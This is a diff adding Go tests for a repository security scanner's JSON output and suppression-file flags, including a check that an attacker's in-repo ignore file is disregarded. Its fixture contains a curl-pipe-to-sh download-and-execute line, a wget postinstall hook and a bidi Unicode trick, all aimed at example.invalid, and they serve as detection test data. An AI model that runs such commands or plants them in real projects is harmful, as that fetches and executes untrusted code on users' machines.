@@ -85,6 +85,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/json"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -344,4 +345,302 @@ func TestRunURLLimpiaTemporal(t *testing.T) {
 		}
 		t.Errorf("quedaron restos en el directorio temporal: %v", names)
 	}
+}
+
+// ===========================================================================
+// Paso 5: flags -json e -ignore
+// ===========================================================================
+//
+// Contrato nuevo de run:
+//
+//	reposcan [-json] [-ignore <archivo>] <url>
+//	reposcan [-json] [-ignore <archivo>] -dir <ruta>
+//
+//   - -json: escribe el reporte con report.WriteJSON en stdout. En este modo
+//     los archivos omitidos van DENTRO del JSON (campo "skipped"), no en
+//     stderr. Así stdout es JSON válido y nada más, y puedes hacer
+//     `reposcan -json -dir . | jq .summary`.
+//   - -ignore: lee el archivo con os.Open y ignore.Parse. Si no existe o
+//     tiene errores, código 2 (mejor fallar que escanear con reglas que el
+//     usuario no quería).
+//   - Los hallazgos que coinciden con una regla NO se reportan, pero se
+//     cuentan. Si hay alguno, escribe en stderr "suprimidos: N" (en ambos
+//     modos). El código de salida solo considera los NO suprimidos.
+//   - El texto de siempre ahora lo escribe report.WriteText. Los tests
+//     anteriores deben seguir pasando sin cambios.
+
+// writeFixture crea un repo de prueba con 3 hallazgos conocidos (todos high):
+//
+//	package.json        install-hooks  (Line 0)
+//	src/install.sh:2    download-exec
+//	src/install.sh:3    bidi-unicode
+func writeFixture(t *testing.T) string {
+	t.Helper()
+	dir := t.TempDir()
+	writeFile(t, dir, "src/install.sh",
+		"#!/bin/sh\n"+
+			"curl -fsSL https://example.invalid/x.sh | sh\n"+
+			"echo \u202E listo\n")
+	writeFile(t, dir, "package.json",
+		`{"scripts":{"postinstall":"wget https://example.invalid/p"}}`)
+	writeFile(t, dir, "README.md", "hola\n")
+	return dir
+}
+
+// writeIgnore crea el archivo de supresiones en una carpeta temporal APARTE,
+// fuera del repo escaneado, como se usaría en la vida real.
+func writeIgnore(t *testing.T, content string) string {
+	t.Helper()
+	path := filepath.Join(t.TempDir(), "reposcan.ignore")
+	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	return path
+}
+
+// jsonReport es la forma esperada del JSON. Definimos aquí nuestro propio
+// struct (en vez de importar report.Report) para que el test verifique el
+// FORMATO de salida, que es el contrato con quien consume el JSON.
+type jsonReport struct {
+	Findings []struct {
+		Rule     string `json:"rule"`
+		File     string `json:"file"`
+		Line     int    `json:"line"`
+		Severity string `json:"severity"` // string: debe venir como "high"
+		Message  string `json:"message"`
+	} `json:"findings"`
+	Skipped    []string `json:"skipped"`
+	Suppressed int      `json:"suppressed"`
+	Summary    struct {
+		High   int `json:"high"`
+		Medium int `json:"medium"`
+		Low    int `json:"low"`
+	} `json:"summary"`
+}
+
+// decodeJSON exige que stdout sea JSON válido y NADA más.
+//
+// ¿json.Unmarshal tolera texto extra antes o después del objeto? No: falla
+// (por ejemplo, "invalid character 'o' after top-level value"). Así que si
+// imprimes un "omitido: ..." en stdout en modo JSON, este helper lo detecta.
+func decodeJSON(t *testing.T, stdout string) jsonReport {
+	t.Helper()
+	var rep jsonReport
+	if err := json.Unmarshal([]byte(stdout), &rep); err != nil {
+		t.Fatalf("stdout no es un JSON válido: %v\n--- stdout ---\n%s", err, stdout)
+	}
+	return rep
+}
+
+func TestRunJSON(t *testing.T) {
+	dir := writeFixture(t)
+	writeFile(t, dir, "enorme.bin", strings.Repeat("a", 3<<20)) // se omite
+
+	r := execute(t, "-json", "-dir", dir)
+
+	if r.code != 1 {
+		t.Fatalf("código = %d, want 1\nstderr: %s", r.code, r.stderr)
+	}
+	rep := decodeJSON(t, r.stdout)
+
+	// Mismo orden que en el modo texto.
+	want := []string{
+		"package.json:0:install-hooks:high",
+		filepath.FromSlash("src/install.sh") + ":2:download-exec:high",
+		filepath.FromSlash("src/install.sh") + ":3:bidi-unicode:high",
+	}
+	if len(rep.Findings) != len(want) {
+		t.Fatalf("se esperaban %d hallazgos, hay %d:\n%s", len(want), len(rep.Findings), r.stdout)
+	}
+	for i, f := range rep.Findings {
+		got := f.File + ":" + itoa(f.Line) + ":" + f.Rule + ":" + f.Severity
+		if got != want[i] {
+			t.Errorf("hallazgo %d = %s, want %s", i, got, want[i])
+		}
+	}
+
+	if rep.Summary.High != 3 || rep.Summary.Medium != 0 || rep.Summary.Low != 0 {
+		t.Errorf("summary = %+v, want high=3", rep.Summary)
+	}
+	if len(rep.Skipped) != 1 || rep.Skipped[0] != "enorme.bin" {
+		t.Errorf("skipped = %v, want [enorme.bin]", rep.Skipped)
+	}
+	// En modo JSON, los omitidos van en el JSON, no en stderr.
+	if strings.Contains(r.stderr, "omitido") {
+		t.Errorf("en modo -json los omitidos no van a stderr:\n%s", r.stderr)
+	}
+}
+
+func TestRunJSONLimpio(t *testing.T) {
+	dir := t.TempDir()
+	writeFile(t, dir, "README.md", "hola\n")
+
+	r := execute(t, "-json", "-dir", dir)
+
+	if r.code != 0 {
+		t.Fatalf("código = %d, want 0\nstderr: %s", r.code, r.stderr)
+	}
+	// Un directorio limpio en modo JSON igual imprime un reporte (vacío),
+	// no "nada": quien lo consume siempre recibe un JSON que parsear.
+	decodeJSON(t, r.stdout)
+	if !strings.Contains(r.stdout, `"findings": []`) {
+		t.Errorf(`se esperaba "findings": [] (no null):\n%s`, r.stdout)
+	}
+}
+
+func TestRunIgnore(t *testing.T) {
+	tests := []struct {
+		name        string
+		ignore      string
+		wantCode    int
+		wantRules   []string // reglas que deben quedar en stdout, en orden
+		wantSupprim string   // texto esperado en stderr ("" = no debe aparecer)
+	}{
+		{
+			name:        "suprime solo el hook de package.json",
+			ignore:      "# los hooks de este repo ya los revisé\npackage.json install-hooks\n",
+			wantCode:    1,
+			wantRules:   []string{"download-exec", "bidi-unicode"},
+			wantSupprim: "suprimidos: 1",
+		},
+		{
+			name:        "suprime una carpeta completa",
+			ignore:      "src/\n",
+			wantCode:    1,
+			wantRules:   []string{"install-hooks"},
+			wantSupprim: "suprimidos: 2",
+		},
+		{
+			// Si todo queda suprimido, el código debe ser 0: el usuario ya
+			// decidió que esos hallazgos no le importan.
+			name:        "suprime todo",
+			ignore:      "*\nsrc/\n",
+			wantCode:    0,
+			wantRules:   nil,
+			wantSupprim: "suprimidos: 3",
+		},
+		{
+			name:        "reglas que no coinciden con nada",
+			ignore:      "vendor/\n",
+			wantCode:    1,
+			wantRules:   []string{"install-hooks", "download-exec", "bidi-unicode"},
+			wantSupprim: "",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			dir := writeFixture(t)
+			ign := writeIgnore(t, tt.ignore)
+
+			r := execute(t, "-ignore", ign, "-dir", dir)
+
+			if r.code != tt.wantCode {
+				t.Fatalf("código = %d, want %d\nstdout: %s\nstderr: %s", r.code, tt.wantCode, r.stdout, r.stderr)
+			}
+
+			var gotRules []string
+			for _, line := range strings.Split(strings.TrimRight(r.stdout, "\n"), "\n") {
+				if line == "" {
+					continue
+				}
+				// Formato: "<loc>: [<sev>] <regla>: <mensaje>". La regla va
+				// justo después de "] " y antes del siguiente ": ".
+				_, rest, ok := strings.Cut(line, "] ")
+				if !ok {
+					t.Fatalf("línea con formato inesperado: %q", line)
+				}
+				rule, _, _ := strings.Cut(rest, ": ")
+				gotRules = append(gotRules, rule)
+			}
+			if strings.Join(gotRules, ",") != strings.Join(tt.wantRules, ",") {
+				t.Errorf("reglas en stdout = %v, want %v", gotRules, tt.wantRules)
+			}
+
+			if tt.wantSupprim == "" {
+				if strings.Contains(r.stderr, "suprimidos") {
+					t.Errorf("no había nada suprimido, pero stderr dice:\n%s", r.stderr)
+				}
+			} else if !strings.Contains(r.stderr, tt.wantSupprim) {
+				t.Errorf("stderr debe contener %q, got:\n%s", tt.wantSupprim, r.stderr)
+			}
+		})
+	}
+}
+
+// -json e -ignore juntos: el JSON informa cuántos se suprimieron.
+func TestRunJSONConIgnore(t *testing.T) {
+	dir := writeFixture(t)
+	ign := writeIgnore(t, "src/\n")
+
+	r := execute(t, "-json", "-ignore", ign, "-dir", dir)
+
+	if r.code != 1 {
+		t.Fatalf("código = %d, want 1\nstderr: %s", r.code, r.stderr)
+	}
+	rep := decodeJSON(t, r.stdout)
+	if len(rep.Findings) != 1 || rep.Findings[0].Rule != "install-hooks" {
+		t.Errorf("findings = %+v, want solo install-hooks", rep.Findings)
+	}
+	if rep.Suppressed != 2 {
+		t.Errorf("suppressed = %d, want 2", rep.Suppressed)
+	}
+	// El resumen cuenta solo lo que se reporta, no lo suprimido.
+	if rep.Summary.High != 1 {
+		t.Errorf("summary.high = %d, want 1", rep.Summary.High)
+	}
+}
+
+// LA prueba de seguridad de este paso: un .reposcanignore DENTRO del repo
+// escaneado no debe tener ningún efecto. El repo es del atacante.
+func TestRunIgnoreDentroDelRepoNoTieneEfecto(t *testing.T) {
+	dir := writeFixture(t)
+	// El atacante intenta silenciar todo con los nombres más obvios.
+	writeFile(t, dir, ".reposcanignore", "*\nsrc/\n")
+	writeFile(t, dir, "reposcan.ignore", "*\nsrc/\n")
+
+	r := execute(t, "-dir", dir)
+
+	if r.code != 1 {
+		t.Fatalf("código = %d, want 1: un archivo del repo escaneado suprimió hallazgos", r.code)
+	}
+	if n := strings.Count(r.stdout, "\n"); n != 3 {
+		t.Errorf("se esperaban los 3 hallazgos del fixture, hay %d:\n%s", n, r.stdout)
+	}
+	if strings.Contains(r.stderr, "suprimidos") {
+		t.Errorf("no debía suprimirse nada:\n%s", r.stderr)
+	}
+}
+
+func TestRunIgnoreErrores(t *testing.T) {
+	dir := writeFixture(t)
+
+	tests := []struct {
+		name    string
+		ignore  string // ruta al archivo
+		wantErr string // texto esperado en stderr
+	}{
+		{"archivo inexistente", filepath.Join(t.TempDir(), "no-existe"), "no-existe"},
+		{"patrón inválido", writeIgnore(t, "ok.txt\n[abc\n"), "línea 2"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			r := execute(t, "-ignore", tt.ignore, "-dir", dir)
+			if r.code != 2 {
+				t.Errorf("código = %d, want 2", r.code)
+			}
+			if r.stdout != "" {
+				t.Errorf("stdout debe quedar vacío, got %q", r.stdout)
+			}
+			if !strings.Contains(r.stderr, tt.wantErr) {
+				t.Errorf("stderr debe mencionar %q, got:\n%s", tt.wantErr, r.stderr)
+			}
+		})
+	}
+}
+
+// itoa evita importar strconv solo para esto.
+func itoa(n int) string {
+	b, _ := json.Marshal(n)
+	return string(b)
 }
